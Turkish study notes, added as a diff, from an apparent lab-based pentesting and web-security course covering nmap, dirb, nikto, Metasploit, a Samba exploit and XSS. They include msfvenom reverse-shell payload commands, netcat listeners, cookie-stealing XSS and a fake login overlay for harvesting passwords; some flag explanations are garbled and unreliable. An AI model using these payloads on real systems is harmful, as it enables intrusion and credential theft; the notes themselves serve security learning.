@@ -623,12 +623,264 @@ Veri Bütünlüğü
  -iki güvenli ortam=Akıllı kartlar,IOT cihazları.
  -Diğer=Dijital imza gibi konular.Asimetrik alg.
 
+-----------------------------------------------------
+
+                          ----- SIZMA TESTİNE GİRİŞ -------
+
+1.VİDEO Sızma testine giriş
+
+Bir hedefteki zaafiyeti bulmak ve bunların istismar edilebilirliğini test etmek için yapılan saldırılar.Sistemin güvenliği
+değerlendirilir.Yetkili kişiler tarafından yasal olarak yapılır.
+-------------------------------------------------
+
+2.VİDEO Kali Linux ve Hedef Makina Linkleri
+
+ Kurulum linklerini verdi.
+------------------------------------------------
+
+3.VİDEO Lab ortamı kurulumu
+
+ ifconfig=ip'yi verir
+ setxkbmap tr=klavyeyi türkçe yapar
+ netdiscover -i eth0=diğer makinaları tespit eder
+
+----------------------------------
+
+4.VİDEO Kali Linux Hakkında
+
+ Yüzlerce güvenlik ve sızma testi aracı içeren,risk azaltma stratejilerini test etmemizi sağlayan bir işletim sistemi
+-----------------------------------------
+
+5.Video Pasif Bilgi Toplama
+
+  Hedef ile direkt iletişime geçmeden internet üzerinden bilgi toplamak.En çok kullanılan Google Hacking Database.
+
+  örnek;
+
+  site:microsoft.com = sadece microsoft.com'lu sayfalar gelir
+  filetype:pdf site:microsoft.com = bunla ilgili pdf'leri verir
+  filetype:pdf site:microsoft.com intitle:office = içinde office geçenleri bul
+  inurl:github ms17-010=bir dosyayı buluyor
+
+  Linuxta "theharvester" ile pasif bilgi toplayabiliriz
+
+  theharvester -d microsoft.com -b bing = bing motoru ile microsoft.com ile ilgili şeyleri getir.
+
+  netcraft sitesinden bilgi toplayabiliyoruz istediğimiz sistemle ilgili.
+------------------------------------------
+
+6.Video Aktif Bilgi Toplama
+
+ Hedef sisteme erişim sağlanarak yapılan bilgi sistemidir.Kullanılan araçlar; nmap,dirp,netcat vs.
+------------------------------
+
+7.Video Nmap nedir nasıl kullanılır
+
+Nmap=Ağdaki cihazların portlarına paketler gönderip açık olup olmadığını, üzerinde çalışan servisleri scriptleri ve zaafiyetlerini vs bulan
+     tarama aracıdır
+
+Hedef dosya,host keşfetme,tarama teknikleri,port belirleme gibi özellikler var.Ekran görüntüsü(Nmap) 
+Bazıları;
+
+-il=dosya adı
+-sn=ping tarama
+-pn=bütün online hostları tehdit etme
+-sS=Tcp tarama
+-sU=Udp tarama
+-p=port'a göre
+-sv=servis versiyon
+-o=işletim sistemi belirleme
+
+nmap -p- -sv 192.168.1.1 -vv = tarar ip'yi ve onun hakkında bilgi verir.Ne kadar süre beklenmiş gibi.
+vv = version verbose
+-p- = tüm portları tara
+-sv = servis versiyon bilgisi
+
+nmap -sn 192.168.1.1-254 -v = ip'yi tarıyor bilgi veriyor.Kaç host var hangisi açık gibi.Buradaki "p" "sn" gibi harfler önemli.Bunlara "nmap -h" ile ulaşabiliriz
+nmap 192.168.1.1 = Üst taraması.Mac adresini ve tcp ile ilgili bilgilerini verir.Versiyon bilgisi yok.
+
+unicorn scan=tcp ve ttl bilgilerini falan gösterir.Hızlı tarama
+
+nmap -F 192.168.1.1 -vv = en çok kullanılan ilk portu tarar.Hızlı tarama 
+nmap -A 192.168.1.1 -vv = nmap üzerinde bulunan scriptlere göre tarayacak ve işletim sistemini bulacak
+--------------------------------------------------
+
+8.Video Dirp ve Nikto
+
+Dirp = Web uygulamalarında alt dizinleri bulmamızı sağlar
+Nikto = Tespit edilen web server'ı tarar ve açıklıkları bulup zaafiyetleri listeler
+
+dirb http://192.168.1.102:8080/manager/html = bu adresteki alt dizinleri getirir.Bundan önce port bilgisini almak için nmap ile taratırız.
+nikto -h http://192.168.1.102:8080/manager/html = buradaki zaafiyetleri getirir
+---------------------------
+
+9.Video Exploit ve Metasploit
+
+ Exploit = Sistemin hatalarından faydalanarak olşturulan programlar.
+
+ Metasploit;
+  Auxiliary=tarama
+  Exploit=zaafiyetlerden faydalanma
+  Payload=exploitin içindeki belirli görev yapan modül
+  Encoder=hedef sistemde payload'umuzun farkedilmemesi için kullanılır
+
+ MsfVenom = Hedef makineye göndereceğimiz payload'u oluşturmaya ve bunu encode etmeye yarar
+ MsfVenom -| payload = içeride bulunan tüm payloadları göster
+ Meterpreter = komutlarda esneklik sağlayan bir shell arayüzü. 
+
+msfconsole = msf'i açar
+msfvenom -l payload = payloadları listeler
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.103 LPORT=7777 f war > shell.war = payload'u bir dosyaya kaydettik
+---------------------------------------------
+
+10.Video Netcat ve Meterpreter
+
+ Netcat = istemci ve sunucu taraflı çalışabilen udp ve tcp portlarını okuyup yazabilen bir araç.
+
+          -port açık mı kapalı mı bakar
+          -dosya transferi
+          -network servisine manuel bağlanır
+-l=listen mode
+-p=port
+-e=dosya aktarımı
+-v=bilgi
+-vv=detaylı bilgi
+
+nc -lvnp 7777 = daha önce yüklemiş olduğu shell dosyasını okuyor ve izinlerini kontrol ediyor.Root yetkisinde çalıştırmak için msfvenom ile ilgili
+                aşağıdaki kodu yazıyor. 
 
 
+msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 --platform java -f jar> privesc.jar
 
+sonra yazma izni olan dosyaları buldu.
 
+ls -alh/usr/bin = yüklü tüm programlar listelenir
+
+pythom -m SimpleHttpServer 80 = bütün dosyaları http server'a açıyor.
+
+Daha sonra diğer makinaya bunları kaydediyor ve ardından burada set komutuyla msfvenom içerisindeki "port" "host" "meterpreter" gibi alanları set ediyor.
+
+set lhost 192.168.1.103
+set lport 4444
+run
+------------------------------------------------
+
+11.VİDEO Lab ortamı uygulamaları
+
+ Kısa bir tekrar yaptı.
+
+ nmap -p- -sV -o 192.168.1.104 -vv = nmap ile tarama yaptı.
+
+ Taradığı yerde smb diye bir zaafiyet aradı.
+
+ --script "smb*" 192.168.1.104 -vv = yazdığı ağ için smb scriptlerini yüklüyor
+ search smb_version = msfvenom'u açarak smb versiyonlarına baktı
+ search link = Yukarıdan aldığı linki buraya kopyaladı
+ use link = bir rhost bilgisi vs geldi
+
+ set rhost 192.168.1.104 = set etti ve run dedi.
+
+ searchsploit samba 2.2 = sambanın versiyonuyla ilgili bilgileri getirdi
+ searchsploit -x = bunun içeriğini görüyor
+ searchsploit -m multiple/remote/10.c = sonuçlarda çıkan path'lerden birini alıp kaydediyor
+ gcc -o sambaexploit 10.c = daha sonra bu 10.c isimli dosyayı execute ediyor.
+ ./sambaexploit = dosyanın içerisinde bazı anahtar harfler var.Örneğin;
+
+ -b=platform
+ -c=ip adresi
+ -p=port         ...gibi
 
  
+./sambaexploit -b O -c 192.168.1.103 192.168.1.104 =yukarıdaki harflere dayanarak bunu yazdı.Ayrıca kendi ip'sini ve hedef ip'sini verdi.
+
+python -m simpleHTTPServer 80 = http'ye açıyor
+
+wget -O gelen.c http://192.168.1.103/10.c = sonra bu dosyaları çekiyor. gelen.c->dosyay isim verdi
+---------------------------------------------
+
+12.VİDEO Lab ortamı uygulamaları 2
+
+searchsploit samba 2.2 = sambanın içindeki uygulamalara baktı.Ordan birisini seçip msfvenom'a yapıştırdı
+
+search trans2open = samba içinden seçtiği bir uygulamaya bakıyor.Bunun içinden linux ile ilgili bir path seçiyor
+
+msfvenomda "use yukarıdanAldığıLink" diyor.Bilgilerini görüyor
+
+show payloads = bütün payloadları listeledi ve linux ile ilgili bir tanesini seçti
+
+set "yukarıdaSeçtiği"
+
+set rhost "hedef ip"
+
+set lhost "local ip"
+
+sonra msfvenom'a exploit yazıp bu dosyanın geldiğini gördü
+
+FTP server kurdu.
+
+FTP 192.168.1.103 = ftp'yi çalıştırdı ve daha sonra verdiği kullanıcı adını girdi.
+
+get 10.c = dosyayı çekiyor
+
+smb = ağ iletişimini ve ağ üzerinden yazıcılara vs erişmeyi sağlayan protokol
+samba = smb protokolü ile geliştirilen uygulama
+----------------------------------------------------------
+
+
+                 ------------Web Uygulama Güvenliğine Giriş------------------
+
+1.Video Lab ortamının kurulumu
+
+Beebox ve vmWare workstation kurdu.Klavyeyi türkçe yaptı -> setxkbmap tr
+--------------------------------
+2.Video FoxyProxy Kurulumu
+----------------------------
+
+3.Video XSS Nedir
+
+Cross site script = Siteler arası betik çalıştırma
+
+Tarayıcıda zararlı kod çalıştırılır.İstemci taraflı zaafiyet.
+
+Kullanıcı bilgileri çalınabilir.Kurban istemediği sayfaya yönlendirilebilir.
+
+Eğer <script>alert("xss")</script>  yazdığımızda xss mesajı veriyorsa burada xss vardır demektir.Bunu atlatmanın yolları yazılımcının
+bazı karaktarleri kara listeye alması,script tagleri dışında başka tagler kullanmak gibi yöntemlerdir.
+
+Reflected xss = Sunucuya birşey kaydetmeden sadece istemci taraflı yapılan saldırı.Sosyal mühendislik ile kurbanın istenen bağlantıya yönlendirilmesi
+
+Stored xss = Kurbanın ziyaret edeceği siteye zararlı kod parçası eklenir ve sunucuya kaydedilir.Genelde forum sitelerinde bulunur.Ekran görüntüsü var(StoredXssTürleri)
+
+Ekran görüntüsü(XssKorunma)
+------------------------------------------
+
+4.Video Reflected XSS
+
+bWAPP sitesinden denemeler yaptı.Kullanıcı adı ve şifre kısımlarına script kodları yazarak çalıştırdı
+
+<script>alert(1)</script> = ekrana 1 yazdı
+
+<script>alert(document.cookie)</script> = cookie'yi verdi
+
+Bunlar sitede XSS saldırısı olduğunu gösterir
+----------------------------------------------
+
+5.Video Stored XSS 
+
+iki kullanıcı oluşturdu.Kurban kullanıcısına alttaki kodu yazdı.Bu kodda login sayfası var böylelikle kullanıcı login olmadığını düşünüp tekrar girecek.
+
+<div style="position:absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: lem;">Please valid:<br><form name="login" action="http://127.0.0.1/login.htm"><table><tr><td>username:</td><td><input type="text" name="username"/></td></tr><tr><td>password:</td><td><input type="password" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+
+Bundan sonra burayı dinlemek için kali linux tarafında "nc -lvp 80" kodunu yazdı ve bu şekilde kullanıcının bilgilerini aldı
+----------------------------------------------
+
+6.Video Idor Nedir
+
+Insecure Direct Object Reference = Sunucu içindeki objelerin referanslarının açık olması bunların değiştirilmesine veya izinsiz erişime neden olabilir
+Ekran görüntüsü(Idor)
+
+Korunmak için her referansın ömrü sadece 1 kullanıcılık veya 1 oturumluk olmalı
+Güvenilmeyen kaynaklardan gelen referanslar kullanılmadan önce erişim yetkilerinin kontrol edilmesi gerekir
 
 
 
